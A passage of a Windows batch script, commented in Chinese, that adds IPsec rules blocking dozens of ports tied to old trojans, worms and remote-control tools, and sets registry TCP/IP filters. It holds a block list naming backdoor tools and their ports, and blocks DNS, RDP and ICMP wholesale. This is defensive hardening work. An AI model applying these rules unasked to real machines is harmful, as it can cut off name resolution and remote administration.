ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo 关闭木马GateCrasher默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo 关闭木马Phase0默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo 关闭木马Priority默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
echo 关闭木马Blade Runner默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
echo 关闭木马Remote Grab默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
echo 关闭木马IcqTrojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300" -f *+0:7300:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
echo 关闭木马InIkiller默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7301" -f *+0:7301:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo 关闭木马Portal Of Doom默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor 2.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11223" -f *+0:11223:TCP -n BLOCK -x >nul
echo 关闭木马Progenic Trojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7307" -f *+0:7307:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor 3.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/22222" -f *+0:22222:TCP -n BLOCK -x >nul
echo 关闭木马Prosiak 0.47默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7308" -f *+0:7308:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor 4.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
echo 关闭木马Remote Windows Shutdown默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7789" -f *+0:7789:TCP -n BLOCK -x >nul
echo 关闭木马ICKiller默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
echo 关闭木马RoboHack默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo 关闭木马Portal of Doom默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -x >nul

gpupdate >nul

echo 正在设置 IP 筛选器……
rem if exist %temp%\ipfilter.reg del %temp%\ipfilter.reg
echo Windows Registry Editor Version 5.00>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters]>>%temp%\ipfilter.reg
echo "EnableSecurityFilters"=dword:00000001>>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg>>%temp%\ipfilter.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{F3BBAABC-03A5-4584-A7A0-0251FA38B8B1}]>>%temp%\ipfilter.reg
echo "TCPAllowedPorts"=hex(07):32,00,31,00,00,00,38,00,30,00,00,00,34,00,30,00,30,\>>%temp%\ipfilter.reg
echo   00,30,00,00,00,00,00>>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]>>%temp%\ipfilter.reg
echo "EnableSecurityFilters"=dword:00000001>>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{F3BBAABC-03A5-4584-A7A0-0251FA38B8B1}]>>%temp%\ipfilter.reg
echo "TCPAllowedPorts"=hex(07):32,00,31,00,00,00,38,00,30,00,00,00,34,00,30,00,30,\>>%temp%\ipfilter.reg
echo   00,30,00,00,00,00,00>>%temp%\ipfilter.reg
echo.>>%temp%\ipfilter.reg
regedit /s %temp%\ipfilter.reg
del %temp%\ipfilter.reg
echo.
echo IP 筛选器设置成功！
rem For PC Server
ipseccmd -w REG -p "HFUT_SECU" -o -x
ipseccmd -w REG -p "HFUT_SECU" -x
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/80" -f *+0:80:TCP -n BLOCK -x
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/1434" -f *+0:1434:UDP -n BLOCK -x
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/445" -f *+0:445:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block UDP/445" -f *+0:445:UDP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1025" -f *+0:1025:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block UDP/139" -f *+0:139:UDP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1068" -f *+0:1068:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/5554" -f *+0:5554:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/9995" -f *+0:9995:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/9996" -f *+0:9996:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block ICMP/255" -f *+0:255:ICMP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/43958" -f *+0:43958:TCP -n BLOCK -x >nul
echo 关闭流行危险端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
echo 关闭木马NetBus Pro开放的端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1092" -f *+0:1092:TCP -n BLOCK -x >nul
echo 关闭蠕虫LoveGate开放的端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/3996" -f *+0:3996:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/4060" -f *+0:4060:TCP -n BLOCK -x >nul
echo 关闭木马RemoteAnything开放的端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
echo 关闭木马ICQTrojan开放的端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1080" -f *+0:1080:TCP -n BLOCK -x >nul
echo 禁止代理服务器扫描…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/113" -f *+0:113:TCP -n BLOCK -x >nul
echo 禁止Authentication Service服务…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/79" -f *+0:79:TCP -n BLOCK -x >nul
echo 禁止Finger扫描…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block UDP/53" -f *+0:53:UDP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/53" -f *+0:53:TCP -n BLOCK -x >nul
echo 禁止区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/707" -f *+0:707:TCP -n BLOCK -x >nul
echo 关闭nachi蠕虫病毒监听端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/808" -f *+0:808:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/23" -f *+0:23:TCP -n BLOCK -x >nul
echo 关闭Telnet 和木马Tiny Telnet Server监听端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/520" -f *+0:520:TCP -n BLOCK -x >nul
echo 关闭Rip 端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo 关闭木马程序BackDoor的默认服务端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo 关闭马程序黑洞2001的默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo 关闭木马程序Ripper的默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo 关闭木马程序Wincrash v2的默认服务端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x >nul
echo 关闭Windows 的远程管理终端（远程桌面）监听端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
echo 关闭msblast冲击波蠕虫监听端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/4899" -f *+0:4899:TCP -n BLOCK -x >nul
echo 关闭远程控制软件（remote administrator)服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/8888" -f *+0:8888:TCP -n BLOCK -x >nul
echo 关闭远程控制软件VNC的两个默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
echo 关闭Dameware服务端默认监听端口（可变！）…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6267" -f *+0:6267:TCP -n BLOCK -x >nul
echo 关闭木马广外女生的默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/660" -f *+0:660:TCP -n BLOCK -x >nul
echo 关闭木马DeepThroat v1.0 - 3.1默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6671" -f *+0:6671:TCP -n BLOCK -x >nul
echo 关闭木马Indoctrination默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
echo 关闭木马PRIORITY默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo 关闭木马网络精灵默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/7511" -f *+0:7511:TCP -n BLOCK -x >nul
echo 关闭木马聪明基因的默认连接端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
echo 关闭木马冰河默认端口(注意可变！)…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
echo 关闭木马WAY2.4默认服务端口…………OK！
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
echo 关闭木马InIkiller默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/19191" -f *+0:19191:TCP -n BLOCK -x >nul
echo 关闭木马兰色火焰默认开放的telnet端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/1029" -f *+0:1029:TCP -n BLOCK -x >nul
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/20168" -f *+0:20168:TCP -n BLOCK -x >nul
echo 关闭lovegate 蠕虫所开放的两个后门端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
echo 关闭木马网络公牛默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
echo 关闭木马SUB7默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
echo 关闭木马NetSphere默认的服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/31337" -f *+0:31337:TCP -n BLOCK -x >nul
echo 关闭木马BO2000默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/45576" -f *+0:45576:TCP -n BLOCK -x >nul
echo 关闭代理软件的控制端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo 关闭木马Schwindler默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo 关闭木马Telecommando默认服务端口…………OK!
ipseccmd  -w REG -p "HFUT_SECU" -r "Block TCP/31338" -f *+0:31338:TCP -n BLOCK -x >nul
echo 关闭木马Back Orifice默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8102" -f *+0:8102:TCP -n BLOCK -x >nul
echo 关闭木马网络神偷默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
echo 关闭木马黑洞2000默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31339" -f *+0:31339:TCP -n BLOCK -x >nul
echo 关闭木马NetSpy DK默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo 关闭木马黑洞2001默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31666" -f *+0:31666:TCP -n BLOCK -x >nul
echo 关闭木马BOWhack默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
echo 关闭木马BigGluck默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo 关闭木马网络精灵3.0，netspy3.0默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40412" -f *+0:40412:TCP -n BLOCK -x >nul
echo 关闭木马The Spy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40421" -f *+0:40421:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
echo 关闭木马wry，赖小子，火凤凰默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40422" -f *+0:40422:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
echo 关闭木马网络公牛，netbull默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40423" -f *+0:40423:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise 2.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23445" -f *+0:23445:TCP -n BLOCK -x >nul
echo 关闭木马网络公牛，netbull默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise 3.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
echo 关闭木马Sockets de Troie默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
echo 关闭木马Sub Seven 2.0+，77，东方魔眼默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo 关闭木马Fore默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
echo 关闭木马Remote Windows Shutdown默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo 关闭木马Telecommando默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
echo 关闭木马BO jammerkillahV默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo 关闭木马Satanz Backdoor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
echo 关闭木马Devil默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo 关闭木马Silencer默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6400" -f *+0:6400:TCP -n BLOCK -x >nul
echo 关闭木马The tHing默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1600" -f *+0:1600:TCP -n BLOCK -x >nul
echo 关闭木马Shivka-Burka默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12346" -f *+0:12346:TCP -n BLOCK -x >nul
echo 关闭木马NetBus 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1807" -f *+0:1807:TCP -n BLOCK -x >nul
echo 关闭木马SpySender默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
echo 关闭木马NetBus Pro默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
echo 关闭木马Shockrave默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1243" -f *+0:1243:TCP -n BLOCK -x >nul
echo 关闭木马SubSeven默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo 关闭木马WebEx默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
echo 关闭木马NetSphere默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1011" -f *+0:1011:TCP -n BLOCK -x >nul
echo 关闭木马Doly Trojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo 关闭木马Silencer默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
echo 关闭木马Psyber Stream Server默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
echo 关闭木马Millenium默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1234" -f *+0:1234:TCP -n BLOCK -x >nul
echo 关闭木马Ultors Trojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
echo 关闭木马Devil 1.03默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo 关闭木马VooDoo Doll默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1492" -f *+0:1492:TCP -n BLOCK -x >nul
echo 关闭木马FTP99CMP默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
echo 关闭木马Streaming Audio Trojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo 关闭木马BackDoor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30303" -f *+0:30303:TCP -n BLOCK -x >nul
echo 关闭木马Socket23默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo 关闭木马Trojan Cow默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo 关闭木马Gatecrasher默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo 关闭木马Ripper默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo 关闭木马Telecommando默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2115" -f *+0:2115:TCP -n BLOCK -x >nul
echo 关闭木马Bugs默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12076" -f *+0:12076:TCP -n BLOCK -x >nul
echo 关闭木马Gjamer默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
echo 关闭木马Deep Throat默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
echo 关闭木马IcqTrojen默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
echo 关闭木马The Invasor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/16969" -f *+0:16969:TCP -n BLOCK -x >nul
echo 关闭木马Priotrity默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2801" -f *+0:2801:TCP -n BLOCK -x >nul
echo 关闭木马Phineas Phucker默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo 关闭木马Vodoo默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30129" -f *+0:30129:TCP -n BLOCK -x >nul
echo 关闭木马Masters Paradise默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5742" -f *+0:5742:TCP -n BLOCK -x >nul
echo 关闭木马Wincrash默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3700" -f *+0:3700:TCP -n BLOCK -x >nul
echo 关闭木马Portal of Doom默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo 关闭木马Wincrash2默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4092" -f *+0:4092:TCP -n BLOCK -x >nul
echo 关闭木马WinCrash默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
echo 关闭木马Netspy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
echo 关闭木马ICQTrojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
echo 关闭木马ShockRave默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5000" -f *+0:5000:TCP -n BLOCK -x >nul
echo 关闭木马Sockets de Troie默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo 关闭木马Stealth Spy默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5001" -f *+0:5001:TCP -n BLOCK -x >nul
echo 关闭木马Sockets de Troie 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo 关闭木马Pass Ripper默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5321" -f *+0:5321:TCP -n BLOCK -x >nul
echo 关闭木马Firehotcker默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo 关闭木马Attack FTP默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
echo 关闭木马Blade Runner默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/21554" -f *+0:21554:TCP -n BLOCK -x >nul
echo 关闭木马GirlFriend默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5401" -f *+0:5401:TCP -n BLOCK -x >nul
echo 关闭木马Blade Runner 1.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo 关闭木马Fore Schwindler默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5402" -f *+0:5402:TCP -n BLOCK -x >nul
echo 关闭木马Blade Runner 2.x默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
echo 关闭木马Tiny Telnet Server默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
echo 关闭木马Robo-Hack默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30999" -f *+0:30999:TCP -n BLOCK -x >nul
echo 关闭木马Kuang默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6670" -f *+0:6670:TCP -n BLOCK -x >nul
echo 关闭木马DeepThroat默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
echo 关闭木马Senna Spy Trojans默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6771" -f *+0:6771:TCP -n BLOCK -x >nul
echo 关闭木马DeepThroat默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456" -f *+0:23456:TCP -n BLOCK -x >nul
echo 关闭木马WhackJob默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo 关闭木马GateCrasher默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo 关闭木马Phase0默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo 关闭木马Priority默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
echo 关闭木马Blade Runner默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
echo 关闭木马Remote Grab默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
echo 关闭木马IcqTrojan默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300" -f *+0:7300:TCP -n BLOCK -x >nul
echo 关闭木马NetMonitor默认服务端口…………OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
echo 关闭木马InIkiller默认服务端口…………OK!
